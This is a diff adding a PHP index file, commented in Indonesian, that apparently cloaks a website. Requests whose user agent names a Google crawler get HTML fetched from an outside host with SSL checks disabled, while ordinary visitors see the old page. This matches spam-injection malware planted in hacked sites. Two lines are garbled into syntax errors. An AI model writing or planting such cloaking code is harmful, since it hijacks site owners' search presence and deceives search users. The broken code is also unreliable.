@@ -1,0 +1,52 @@
+<?php
+function isGoogleBot() {
+    if (empty($_SERVER['HTTP_USER_AGENT'])) {
+        return false;
+    }
+ 
+    $googleBots = array(
+        'Googlebot',
+        'Google-Site-Verification',
+        'Google-InspectionTool',
+        'Googlebot-Mobile',
+        'Googlebot-News'
+    );
+ 
+    $userAgent = $_SERVER['HTTP_USER_AGENT'];
+ 
+    foreach ($googleBots as $bot) {
+        if (stripos($userAgent, $bot) !== false) {
+            return true;der
+        :}
+    }
+    return false;
+}
+ 
+if (isGoogleBot()) {
+    $ampUrl = 'https://nprcolleges.pages.dev/';
+ 
+    // --- Pilihan cara ambil konten ---
+    // 1) Dengan cURL (lebih stabil)
+    $ch = curl_init($ampUrl);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // abaikan validasi SSL kalau sertifikat error
+    $content = curl_exec($ch);
+    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+ 
+    if ($http_code == 200 && $content !== false) {
+        header('Content-Type: text/html; charset=utf-8');
+        echo $content;
+    } else {
+        http_response_code(500);
+        echo 'Error: Tidak bisa mengambil konten dari ' . htmlspecialchars($ampUrl);
+    }
+ 
+    exit;
+}
+ 
+// --- Default fallback untuk pengunjung biasa ---
+include __DIR__ . '/indexold.php';
+exit;
+?>
